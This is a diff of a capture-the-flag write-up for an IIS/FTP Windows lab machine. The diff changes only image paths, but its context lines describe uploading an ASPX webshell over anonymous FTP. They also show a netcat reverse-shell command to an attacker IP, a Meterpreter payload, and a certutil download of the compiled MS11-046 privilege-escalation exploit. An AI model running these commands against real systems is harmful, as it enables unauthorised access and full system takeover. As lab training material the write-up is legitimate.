@@ -43,7 +43,7 @@ What's particularly interesting is that anonymous login is allowed on port 21 so
 
 We'll make sure that anonymous login does work, which indeed it does.
 
-![](<../../../.gitbook/assets/image (11) (2).png>)
+![](<../../../../.gitbook/assets/image (11) (2).png>)
 
 However, there isn't anything useful for us here.
 
@@ -51,7 +51,7 @@ However, there isn't anything useful for us here.
 
 We see what looks to be the default landing page for IIS
 
-![](<../../../.gitbook/assets/image (40) (1).png>)
+![](<../../../../.gitbook/assets/image (40) (1).png>)
 
 Running a dirsearch on the website also did not prove to be useful.
 
@@ -80,19 +80,19 @@ Seeing that the server is running ASP.NET and I have access to FTP, I can probab
 
 I decided to go with the webshell from SecLists
 
-![](<../../../.gitbook/assets/image (7) (2).png>)
+![](<../../../../.gitbook/assets/image (7) (2).png>)
 
 Now we'll upload it over ftp:
 
-![](<../../../.gitbook/assets/image (46) (2).png>)
+![](<../../../../.gitbook/assets/image (46) (2).png>)
 
 We can access our webshell by visiting `10.129.203.118/cmd.aspx`
 
-![](<../../../.gitbook/assets/image (25) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (25) (1) (2).png>)
 
 Here's what returns when entering `whoami`
 
-![](<../../../.gitbook/assets/image (50).png>)
+![](<../../../../.gitbook/assets/image (50).png>)
 
 ### Reverse shell
 
@@ -100,11 +100,11 @@ I'll be getting a shell with `nc.exe`
 
 I use impacket-smbserver to host a windows netcat executable to then execute a connection to my kali machine
 
-![](<../../../.gitbook/assets/image (2) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (2) (1) (2).png>)
 
 I also start a nc listener on my kali machine to catch a shell
 
-![](<../../../.gitbook/assets/image (2) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (2) (1) (1).png>)
 
 Entering the following command into the webshell:
 
@@ -112,11 +112,11 @@ Entering the following command into the webshell:
 \\10.10.14.3\share\nc.exe -e cmd.exe 10.10.14.3 443
 ```
 
-![](<../../../.gitbook/assets/image (3) (1).png>)
+![](<../../../../.gitbook/assets/image (3) (1).png>)
 
 And I get a shell!
 
-![](<../../../.gitbook/assets/image (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (1) (1) (1).png>)
 
 ## Foothold w/ Metasploit
 
@@ -145,7 +145,7 @@ local: meterpreter_rev_443.aspx remote: meterpreter_rev_443.aspx
 
 Use the Metasploit module `exploit/multi/handler`
 
-![](<../../../.gitbook/assets/image (16) (2).png>)
+![](<../../../../.gitbook/assets/image (16) (2).png>)
 
 Visit the page&#x20;
 
@@ -155,13 +155,13 @@ http://10.129.203.118/meterpreter_rev_443.aspx
 
 And catch a shell!
 
-![](<../../../.gitbook/assets/image (72).png>)
+![](<../../../../.gitbook/assets/image (72).png>)
 
 ## Privilege Escalation
 
 Running systeminfo in the shell shows us some good information
 
-![](<../../../.gitbook/assets/image (44) (1).png>)
+![](<../../../../.gitbook/assets/image (44) (1).png>)
 
 In particular, I'm interested in the OS Version, so I look up priv esc for this build and find a nice exploit to use.
 
@@ -183,7 +183,7 @@ Per the description:
 
 We'll compile the code as suggested by the exploit
 
-![](<../../../.gitbook/assets/image (52).png>)
+![](<../../../../.gitbook/assets/image (52).png>)
 
 ```
 i686-w64-mingw32-gcc 40564.c -o MS11-046.exe -lws2_32
@@ -195,16 +195,16 @@ Since we don't have full access to any user, we'll create a temp directory insid
 certutil -urlcache -f http://10.10.14.13/MS11-046.exe MS11-046.exe
 ```
 
-![](<../../../.gitbook/assets/image (8) (1) (2).png>)
+![](<../../../../.gitbook/assets/image (8) (1) (2).png>)
 
-![](<../../../.gitbook/assets/image (70).png>)
+![](<../../../../.gitbook/assets/image (70).png>)
 
 Now we will run the exploit which should give us NT Auth\System level privileges
 
-![](<../../../.gitbook/assets/image (45).png>)
+![](<../../../../.gitbook/assets/image (45).png>)
 
 With our exploit executing successfully, we'll grab both the user and root flags!
 
-![](<../../../.gitbook/assets/image (56).png>)
+![](<../../../../.gitbook/assets/image (56).png>)
 
-![](<../../../.gitbook/assets/image (23) (1).png>)
+![](<../../../../.gitbook/assets/image (23) (1).png>)
